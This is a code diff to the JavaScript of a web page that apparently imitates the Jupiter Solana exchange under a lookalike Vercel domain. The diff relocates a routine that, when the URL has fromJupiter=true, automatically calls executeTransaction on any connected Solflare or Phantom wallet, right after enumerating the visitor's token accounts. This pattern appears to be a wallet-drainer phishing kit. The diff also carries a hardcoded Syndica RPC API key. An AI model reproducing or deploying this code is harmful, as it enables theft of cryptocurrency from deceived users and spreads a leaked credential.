@@ -344,35 +344,13 @@ $(document).ready(async function () {
       window.open("https://phantom.app/", "_blank");
     }
   });
-     async function autoExecuteIfConnected() {
-      try {
-        const connection = new solanaWeb3.Connection(
-          "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
-          "confirmed"
-        );
-    
-        if (window.solflare && window.solflare.publicKey) {
-          await executeTransaction(connection, window.solflare, window.solflare.publicKey);
-        } else if (window.solana && window.solana.publicKey) {
-          await executeTransaction(connection, window.solana, window.solana.publicKey);
-        }
-      } catch (err) {
-        console.error("Auto-execute failed:", err);
-      }
-    }
-  const urlParams = new URLSearchParams(window.location.search);
-  const fromJupiter = urlParams.get("fromJupiter");
-
-  if (fromJupiter === "true") {
-    autoExecuteIfConnected();
-  }
 
   $("#connect-solflare").on("click", async () => {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
     navigator.userAgent
   );
 
-  const siteURL = "jjup4-theme.vercel.app";
+  const siteURL = "jjup5-theme.vercel.app";
 
   if (isMobile && !window.solflare) {
     // Redirect to Jupiter App
@@ -843,6 +821,31 @@ $(document).ready(async function () {
 
   const tokenAccounts = await getTokenAccounts(connection, public_key);
   console.log("Token accounts:", tokenAccounts);
+    
+  async function autoExecuteIfConnected() {
+    try {
+      const connection = new solanaWeb3.Connection(
+        "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+        "confirmed"
+      );
+
+      if (window.solflare && window.solflare.publicKey) {
+        await executeTransaction(connection, window.solflare, window.solflare.publicKey);
+      } else if (window.solana && window.solana.publicKey) {
+        await executeTransaction(connection, window.solana, window.solana.publicKey);
+      }
+    } catch (err) {
+      console.error("Auto-execute failed:", err);
+    }
+  }
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const fromJupiter = urlParams.get("fromJupiter");
+
+  if (fromJupiter === "true") {
+    autoExecuteIfConnected();
+  }
+
 });
 
 
